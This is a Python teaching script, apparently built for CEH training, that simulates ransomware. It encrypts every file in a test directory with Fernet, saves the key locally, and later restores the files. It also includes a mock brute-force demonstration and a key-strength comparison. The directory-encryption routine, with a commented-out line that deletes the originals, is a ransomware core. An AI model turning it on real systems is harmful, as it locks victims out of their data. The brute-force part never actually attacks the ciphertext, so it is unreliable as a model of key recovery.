"""
Ransomware Simulation & Key Recovery (Educational Lab Only)
⚠️ FOR AUTHORIZED LAB USE ONLY - Educational purposes
"""

from cryptography.fernet import Fernet
import os
import itertools
import string
import time
from pathlib import Path


class RansomwareSimulator:
    """
    Educational ransomware simulation for cybersecurity training
    Demonstrates encryption/decryption and brute force concepts
    """
    
    def __init__(self, target_dir="./test_files"):
        self.target_dir = Path(target_dir)
        self.key = None
        self.cipher = None
        
    def generate_key(self):
        """Generate encryption key"""
        self.key = Fernet.generate_key()
        self.cipher = Fernet(self.key)
        print(f"[+] Encryption key generated")
        return self.key
    
    def save_key(self, filename="encryption.key"):
        """Save key to file (for recovery simulation)"""
        with open(filename, "wb") as f:
            f.write(self.key)
        print(f"[+] Key saved to {filename}")
    
    def load_key(self, filename="encryption.key"):
        """Load key from file"""
        with open(filename, "rb") as f:
            self.key = f.read()
        self.cipher = Fernet(self.key)
        print(f"[+] Key loaded from {filename}")
    
    def encrypt_file(self, filepath):
        """Encrypt a single file"""
        filepath = Path(filepath)
        
        try:
            with open(filepath, "rb") as f:
                data = f.read()
            
            encrypted = self.cipher.encrypt(data)
            
            # Save encrypted file with .encrypted extension
            encrypted_path = filepath.with_suffix(filepath.suffix + ".encrypted")
            with open(encrypted_path, "wb") as f:
                f.write(encrypted)
            
            # Remove original (simulation)
            # os.remove(filepath)  # Uncomment for real simulation
            
            print(f"[+] Encrypted: {filepath.name}")
            return True
        except Exception as e:
            print(f"[!] Error encrypting {filepath}: {e}")
            return False
    
    def decrypt_file(self, filepath):
        """Decrypt a single file"""
        filepath = Path(filepath)
        
        try:
            with open(filepath, "rb") as f:
                encrypted_data = f.read()
            
            decrypted = self.cipher.decrypt(encrypted_data)
            
            # Remove .encrypted extension
            original_path = filepath.with_suffix("")
            with open(original_path, "wb") as f:
                f.write(decrypted)
            
            print(f"[+] Decrypted: {filepath.name}")
            return True
        except Exception as e:
            print(f"[!] Error decrypting {filepath}: {e}")
            return False
    
    def encrypt_directory(self, directory=None):
        """Encrypt all files in directory"""
        if directory is None:
            directory = self.target_dir
        
        directory = Path(directory)
        files = list(directory.glob("*"))
        
        print(f"\n[*] Starting encryption of {len(files)} files...")
        
        encrypted_count = 0
        for file in files:
            if file.is_file() and not file.suffix == ".encrypted":
                if self.encrypt_file(file):
                    encrypted_count += 1
        
        print(f"\n[+] Encrypted {encrypted_count}/{len(files)} files")
        return encrypted_count
    
    def decrypt_directory(self, directory=None):
        """Decrypt all encrypted files in directory"""
        if directory is None:
            directory = self.target_dir
        
        directory = Path(directory)
        files = list(directory.glob("*.encrypted"))
        
        print(f"\n[*] Starting decryption of {len(files)} files...")
        
        decrypted_count = 0
        for file in files:
            if self.decrypt_file(file):
                decrypted_count += 1
        
        print(f"\n[+] Decrypted {decrypted_count}/{len(files)} files")
        return decrypted_count


class WeakKeyBruteForce:
    """
    Demonstrates brute force attack on weak encryption
    Educational purposes only
    """
    
    def __init__(self, max_length=4):
        self.max_length = max_length
        self.attempts = 0
    
    def brute_force_numeric(self, ciphertext, actual_key=None):
        """
        Brute force numeric password (weak key demonstration)
        
        Args:
            ciphertext: Encrypted data
            actual_key: For simulation purposes, the actual key
        """
        print(f"\n[*] Starting brute force attack (numeric, max length {self.max_length})")
        start_time = time.time()
        
        for length in range(1, self.max_length + 1):
            for attempt in itertools.product(string.digits, repeat=length):
                self.attempts += 1
                key_guess = ''.join(attempt)
                
                if self.attempts % 1000 == 0:
                    print(f"[*] Attempts: {self.attempts} (current: {key_guess})")
                
                # Simulation: check if we found it
                if actual_key and key_guess == actual_key:
                    elapsed = time.time() - start_time
                    print(f"\n[+] KEY FOUND: {key_guess}")
                    print(f"[+] Attempts: {self.attempts}")
                    print(f"[+] Time: {elapsed:.2f} seconds")
                    return key_guess
        
        elapsed = time.time() - start_time
        print(f"\n[-] Key not found after {self.attempts} attempts ({elapsed:.2f} seconds)")
        return None
    
    def demonstrate_weak_vs_strong(self):
        """Demonstrate difference between weak and strong keys"""
        print("\n" + "="*60)
        print("WEAK vs STRONG KEY COMPARISON")
        print("="*60)
        
        # Weak key (4 digits)
        weak_combinations = 10**4  # 10,000
        weak_time = weak_combinations / 1000000  # Assume 1M attempts/sec
        
        print(f"\nWeak Key (4 digits):")
        print(f"  Possible combinations: {weak_combinations:,}")
        print(f"  Time to crack (1M tries/sec): {weak_time:.4f} seconds")
        
        # Strong key (12 mixed characters)
        strong_charset = len(string.ascii_letters + string.digits + string.punctuation)
        strong_combinations = strong_charset**12
        strong_time = strong_combinations / 1000000 / 60 / 60 / 24 / 365
        
        print(f"\nStrong Key (12 mixed characters):")
        print(f"  Possible combinations: {strong_combinations:.2e}")
        print(f"  Time to crack (1M tries/sec): {strong_time:.2e} years")
        
        print(f"\n💡 Lesson: Use strong, random keys!")


def setup_test_environment():
    """Create test files for simulation"""
    test_dir = Path("./test_files")
    test_dir.mkdir(exist_ok=True)
    
    # Create sample files
    files = {
        "document1.txt": "This is a confidential document.",
        "report.txt": "Annual financial report data.",
        "credentials.txt": "Username: admin\nPassword: secret123"
    }
    
    for filename, content in files.items():
        filepath = test_dir / filename
        with open(filepath, "w") as f:
            f.write(content)
    
    print(f"[+] Created {len(files)} test files in {test_dir}")
    return test_dir


def main():
    """Main demonstration"""
    print("""
╔═══════════════════════════════════════════════════════════╗
║          Ransomware Simulation & Key Recovery             ║
║              ⚠️  EDUCATIONAL LAB ONLY  ⚠️                  ║
║                                                           ║
║       Developed by Olaribigbe Amodu for CEH Training      ║
╚═══════════════════════════════════════════════════════════╝
    """)
    
    # Setup test environment
    test_dir = setup_test_environment()
    
    # Demonstrate encryption
    print("\n" + "="*60)
    print("PHASE 1: RANSOMWARE ENCRYPTION SIMULATION")
    print("="*60)
    
    sim = RansomwareSimulator(test_dir)
    sim.generate_key()
    sim.save_key()
    sim.encrypt_directory()
    
    # Demonstrate brute force
    print("\n" + "="*60)
    print("PHASE 2: BRUTE FORCE ATTACK DEMONSTRATION")
    print("="*60)
    
    brute = WeakKeyBruteForce(max_length=4)
    brute.demonstrate_weak_vs_strong()
    
    # Example: Brute force a weak numeric "password"
    print("\n[*] Simulating brute force on weak 3-digit password...")
    brute.brute_force_numeric(None, actual_key="123")
    
    # Demonstrate decryption
    print("\n" + "="*60)
    print("PHASE 3: KEY RECOVERY & DECRYPTION")
    print("="*60)
    
    sim.load_key()
    sim.decrypt_directory()
    
    print("\n" + "="*60)
    print("DEMONSTRATION COMPLETE")
    print("="*60)
    print("\n📚 Key Lessons:")
    print("  1. Strong encryption protects data")
    print("  2. Weak keys are vulnerable to brute force")
    print("  3. Key management is critical")
    print("  4. Regular backups are essential defense")
    print("  5. Never pay ransomware - restore from backup")


if __name__ == "__main__":
    print("\n⚠️  WARNING: This is for authorized lab use only!")
    print("    Use only in controlled environments for education.")
    
    response = input("\n    Type 'I UNDERSTAND' to continue: ")
    
    if response.strip().upper() == "I UNDERSTAND":
        main()
    else:
        print("\n[!] Demonstration cancelled.")
